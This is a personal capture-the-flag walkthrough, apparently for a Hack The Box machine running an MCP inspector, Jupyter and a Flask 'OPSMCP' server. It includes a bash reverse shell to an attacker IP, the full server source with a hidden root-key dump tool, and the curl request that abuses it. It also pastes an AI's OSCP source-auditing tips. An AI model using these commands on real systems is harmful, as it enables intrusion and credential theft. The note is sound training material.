[[Active Notes Template]]
## Provided Credentials
---

```

```

```

```

---
## Open Ports

| Port | Service | Notes |
| ---- | ------- | ----- |
|      |         |       |

```powershell
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
6274/tcp open  unknown

|     <div id="root"></div>
```


---
## Software Versions

```powershell

```


---
## Discovered Subdomains




---
## Discovered Credentials


| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---
## Attack Angles

Internal Only - localhost:8888

Path hijack?
/opt/mcpjam/node_modules/.bin:/opt/node_modules/.bin:/node_modules/.bin:/usr/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin:/opt/mcpjam/node_modules/.bin:/opt/node_modules/.bin:/node_modules/.bin:/usr/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin:/usr/local/bin:/usr/bin:/bin:/snap/bin

-rw-r--r-- 1 root root 334 Jan 22 18:19 /opt/mcpjam/node_modules/@mcpjam/inspector/.env.production

Inside Analyst
/home/analyst/jupyter-env/bin:/usr/local/bin:/usr/bin:/bin:/snap/bin

```powershell
"server": "OPSMCP",
        "version": "2.1.0",
        
        VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

        
            if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })
        
        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })
        
        elif target == "tokens":
            return jsonify({
                "target": "tokens",
                "api_tokens": {
                    "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
                    "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"

```

---
## Steps to User.txt

Version v1.2.4 MCP RCE Reverse shell obtained https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC

Trying to pivot to "analyst"

```powershell
find / -name "*jupyter*" 2>/dev/null
/opt/mcpjam/node_modules/simple-icons/icons/jupyter.svg
/usr/lib/python3/dist-packages/pip/_vendor/rich/__pycache__/jupyter.cpython-310.pyc
/usr/lib/python3/dist-packages/pip/_vendor/rich/jupyter.py
/etc/systemd/system/jupyter.service
/etc/systemd/system/multi-user.target.wants/jupyter.service
/sys/fs/cgroup/system.slice/jupyter.service
/run/systemd/units/invocation:jupyter.service
```

```powershell
cat /etc/systemd/system/jupyter.service
[Unit]
Description=Jupyter Notebook Server
After=network.target

[Service]
Type=simple
User=analyst
WorkingDirectory=/home/analyst
Environment=PATH=/home/analyst/jupyter-env/bin:/usr/local/bin:/usr/bin:/bin
Environment=JUPYTER_TOKEN=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
ExecStart=/home/analyst/jupyter-env/bin/jupyter lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token='a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7' --ServerApp.password='' --ServerApp.allow_origin='' --ServerApp.disable_check_xsrf=False
Restart=always
RestartSec=10
```

Use token to login on port8888

This sends us to jupyter lab, granting access to analyst's terminal

bash -i >& /dev/tcp/10.10.16.26/4444 0>&1

Grants me reverse shell on KALI ATTACKER


---
## Steps to root.txt

On analyst, ps auxww | grep root reveals /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py which shows 

```
#!/usr/bin/env python3
"""
OPSMCP - Operations MCP Server
Internal tool for system operations management
"""

from flask import Flask, jsonify, request
import os

app = Flask(__name__)

# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Registered tools (visible)
VISIBLE_TOOLS = {
    "ops.system_status": {
        "description": "Get system status and health metrics",
        "parameters": {}
    },
    "ops.list_services": {
        "description": "List running services",
        "parameters": {}
    },
    "ops.check_disk": {
        "description": "Check disk usage",
        "parameters": {}
    },
    "ops.view_logs": {
        "description": "View recent system logs",
        "parameters": {"service": "string"}
    }
}

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}

ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}

def check_auth():
    """Check API key authentication"""
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY

@app.route('/')
def index():
    return jsonify({
        "server": "OPSMCP",
        "version": "2.1.0",
        "status": "operational",
        "endpoints": ["/tools/list", "/tools/call", "/health"],
        "auth": "Required - X-API-Key header"
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "uptime": "14d 3h 22m"})

@app.route('/tools/list')
def list_tools():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    return jsonify({
        "tools": list(VISIBLE_TOOLS.keys()),
        "count": len(VISIBLE_TOOLS),
        "details": VISIBLE_TOOLS
    })

@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    data = request.get_json() or {}
    tool_name = data.get('name', '')
    args = data.get('arguments', {})
    
    if not tool_name:
        return jsonify({"error": "Tool name required"}), 400
    
    if tool_name not in ALL_TOOLS:
        return jsonify({"error": f"Unknown tool: {tool_name}"}), 404
    
    # Execute tool
    if tool_name == "ops.system_status":
        return jsonify({
            "cpu": "23%",
            "memory": "1.2GB/4GB",
            "load": "0.45",
            "status": "nominal"
        })
    
    elif tool_name == "ops.list_services":
        return jsonify({
            "services": [
                {"name": "nginx", "status": "running", "pid": 1234},
                {"name": "opsmcp", "status": "running", "pid": 5678},
                {"name": "jupyter", "status": "running", "pid": 9012},
                {"name": "mcpjam", "status": "running", "pid": 3456}
            ]
        })
    
    elif tool_name == "ops.check_disk":
        return jsonify({
            "filesystems": [
                {"mount": "/", "used": "4.2G", "available": "15G", "percent": "22%"},
                {"mount": "/home", "used": "1.1G", "available": "8G", "percent": "12%"}
            ]
        })
    
    elif tool_name == "ops.view_logs":
        service = args.get('service', 'system')
        return jsonify({
            "service": service,
            "logs": [
                "[2026-01-22 10:00:01] Service started",
                "[2026-01-22 10:00:02] Listening on configured port",
                "[2026-01-22 10:15:33] Health check passed",
                "[2026-01-22 11:00:00] Routine maintenance completed"
            ]
        })
    
    elif tool_name == "ops._debug_mode":
        return jsonify({
            "debug": True,
            "message": "Debug mode enabled",
            "hidden_tools": list(HIDDEN_TOOLS.keys()),
            "note": "Debug endpoints now accessible"
        })
    
    elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })
        
        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })
        
        elif target == "tokens":
            return jsonify({
                "target": "tokens",
                "api_tokens": {
                    "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
                    "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"
                }
            })
        
        else:
            return jsonify({
                "error": "Invalid target",
                "valid_targets": ["ssh_keys", "passwords", "tokens"]
            })
    
    return jsonify({"error": "Tool execution failed"}), 500

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```

Gemini says 

```powershell
Reading source code is a massive "cheat code" in OSCP. When you have access to the source code (White-Box testing), you do **not** need to fuzz, guess, or enumerate like you would in a Black-Box scenario.

Yes, you absolutely could have skipped `/tools/list`, `/tools/call`, and every other trial-and-error step. You would have owned this machine in 30 seconds.

Here is the "OSCP-Speed-Reader" workflow to find these bugs without getting bogged down in theory.

### The 4-Step "Speed Read" Workflow

When you get a file like `server.py` in an exam or CTF, do not read it line-by-line. Follow this order:

#### 1. Identify the Entry Points

Immediately search for the route definitions. In Python Flask, this is always `@app.route`.

- **Action:** `grep "@app.route" server.py`
    
- **Why:** This tells you every place a user can "touch" the application. It creates a map of the API surface.
    

#### 2. Find the "Sinks" (The Dangerous Functions)

You aren't looking for standard code; you are looking for **sinks**—functions that handle file systems, database queries, or command execution.

- **Search for keywords:** `open(`, `os.system(`, `subprocess(`, `eval(`, `exec(`, `pickle.loads(`, `eval(`.
    
- **In this case:** You would have seen `open('/root/.ssh/id_rsa', 'r')`. That is a **massive red flag**. It tells you immediately that there is a path to read root files.
    

#### 3. Trace the "Data Flow"

Once you find a dangerous sink (like `open`), look at the code **immediately preceding it** to see how the application gets the input.

- You saw `target = args.get('target', '')`.
    
- This tells you: "If I can control `target`, I control the file being opened."
    

#### 4. Find the "Gatekeeper" (Authentication)

Before you can reach that sink, you have to pass the Auth check.

- **Action:** Look for a function like `check_auth` or a decorator like `@requires_auth`.
    
- You found `VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"`. Now you have the key.
    

### Why this changes your strategy

If you had followed this "Speed Read" process:

1. **Grep `@app.route`:** You find `/tools/call` takes a POST request.
    
2. **Look at `/tools/call`:** You see it parses JSON and looks for `name` and `arguments`.
    
3. **Read the logic:** You see the `if tool_name == "ops._admin_dump":` block.
    
4. **See the Sink:** You see it reads `/root/.ssh/id_rsa`.
    
5. **Result:** You immediately know the payload required to get root access.
    

**You stop being a "user" and start being a "code auditor."**

### Important Distinction for OSCP

- **If you have code (White-Box):** Skip enumeration. Go straight to the vulnerabilities (the sinks).
    
- **If you DON'T have code (Black-Box):** You **must** enumerate (`/tools/list`) because you don't know what endpoints exist or what inputs they accept.
    

In the exam, if you find a way to download the source code, stop what you are doing. Don't waste time fuzzing. Download the files, `grep` for the dangerous functions, and trace the path backward from the sink to the user input.

**Does this "Grep-for-Sinks" approach make sense, or would you like a list of the most common dangerous Python functions to keep in your notes for the exam?**
```

So final request is

```powershell
curl -v -X POST http://localhost:8888/tools/call \
     -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
     -H "Content-Type: application/json" \
     -d '{
           "name": "ops._admin_dump",
           "arguments": {
               "target": "ssh_keys",
               "confirm": true
           }
         }'
```

Gives Root SSH Key

```
cat id_rsa | sed -e 's/\\n/\n/g' -e 's/"//g' | fold -w 64 > id_rsa.clean
```

clean dirty RSA key, then SSH in

---

## User Flag

```

```

## Root Flag

```

```